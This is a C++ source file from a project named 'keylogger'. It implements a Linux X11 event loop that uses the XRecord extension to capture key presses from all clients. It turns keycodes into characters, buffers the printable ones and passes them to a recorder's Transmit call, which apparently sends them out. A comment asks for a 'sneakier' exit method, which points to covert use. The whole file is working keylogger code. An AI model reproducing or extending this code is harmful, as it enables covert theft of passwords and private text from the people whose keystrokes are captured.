#include "recorder/event_loop.h"

#include <atomic>
#include <cctype>
#include <stdexcept>

#include "recorder/recorder.h"

#ifdef __linux__

#include <X11/Xlib.h>
#include <X11/Xlibint.h>
#include <X11/Xutil.h>
#include <X11/extensions/record.h>

static std::atomic_bool exit_event_loop(false);

struct CallbackData {
  ::Display* ctrl_disp = nullptr;
  keylogger::Recorder* recorder = nullptr;
};

/* Refer to libxnee. */
union XRecordDatum {
  unsigned char type;
  xEvent event;
  xResourceReq req;
  xGenericReply reply;
  xError error;
  xConnSetupPrefix setup;
};

void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
  if (hook->category != XRecordFromServer) {
    ::XRecordFreeData(hook);
    return;
  }

  CallbackData* cb_data = reinterpret_cast<CallbackData*>(closure);
  XRecordDatum* data = reinterpret_cast<XRecordDatum*>(hook->data);

  int event_type = data->type;
  unsigned int key_code = data->event.u.u.detail;

  /* In order to convert the key_code into the corresponding string, we need to
   * synthesize an artificial XKeyEvent, to feed later to the XLookupString
   * function. */
  ::XKeyEvent raw_event = {
      .type = event_type,
      .serial = 0,
      .send_event = False,
      .display = cb_data->ctrl_disp,
      .window = data->event.u.focus.window,
      .root = ::XDefaultRootWindow(cb_data->ctrl_disp),
      .subwindow = None,
      .time = data->event.u.keyButtonPointer.time,
      .x = 1,
      .y = 1,
      .x_root = 1,
      .y_root = 1,
      .state = data->event.u.keyButtonPointer.state,
      .keycode = key_code,
      .same_screen = True,
  };

  /* TODO: Need to look into having a sneakier way of exiting the event loop
   * than just pressing ESC. */
  const int kEsc = 9;
  char character = '\0';
  int len = ::XLookupString(&raw_event, &character, sizeof(character), nullptr,
                            nullptr);
  switch (event_type) {
    case KeyPress:
      if (key_code == kEsc) { /* if ESC is pressed at any time, exit */
        exit_event_loop = true;
      } else {
        /* Casting std::isprint()'s argument to unsigned char as advised here:
         * https://en.cppreference.com/w/cpp/string/byte/isprint*/
        if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
          /* Buffer printable characters, discard all others. */
          cb_data->recorder->BufferKeyPress(character);
        }
      }
      break;
    default:
      break;
  }
  ::XRecordFreeData(hook);
}

void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
  ::Display* ctrl_disp = XOpenDisplay(nullptr);
  ::Display* data_disp = XOpenDisplay(nullptr);
  if (!ctrl_disp || !data_disp) {
    throw std::runtime_error("unable to open X display");
  }

  int major = 0;
  int minor = 0;
  if (!::XRecordQueryVersion(ctrl_disp, &major, &minor)) {
    throw std::runtime_error("RECORD extension not supported on this X server");
  }

  /* We must set the ctrl_disp to sync mode, or, when we enable the context
   * in data_disp, there will be a fatal X error. */
  ::XSynchronize(ctrl_disp, true);

  ::XRecordRange* record_rng = ::XRecordAllocRange();
  if (!record_rng) {
    throw std::runtime_error("could not alloc record range");
  }
  record_rng->device_events.first = KeyPress;
  record_rng->device_events.last = KeyRelease;

  ::XRecordClientSpec record_spec = XRecordAllClients;
  ::XRecordContext record_ctx =
      ::XRecordCreateContext(ctrl_disp, 0, &record_spec, 1, &record_rng, 1);
  if (!record_ctx) {
    throw std::runtime_error("could not create record context");
  }

  CallbackData cb_data{
      .ctrl_disp = ctrl_disp,
      .recorder = recorder,
  };
  if (!::XRecordEnableContextAsync(data_disp, record_ctx, KeyCallback,
                                   reinterpret_cast<::XPointer>(&cb_data))) {
    throw std::runtime_error("could not enable record context");
  }

  while (!exit_event_loop) {
    ::XRecordProcessReplies(data_disp);
  }

  /* Flush any remaining keycodes in the recorder. */
  recorder->Transmit();

  ::XRecordDisableContext(ctrl_disp, record_ctx);
  ::XRecordFreeContext(ctrl_disp, record_ctx);
  ::XFree(record_rng);
  ::XCloseDisplay(data_disp);
  ::XCloseDisplay(ctrl_disp);
}

#endif
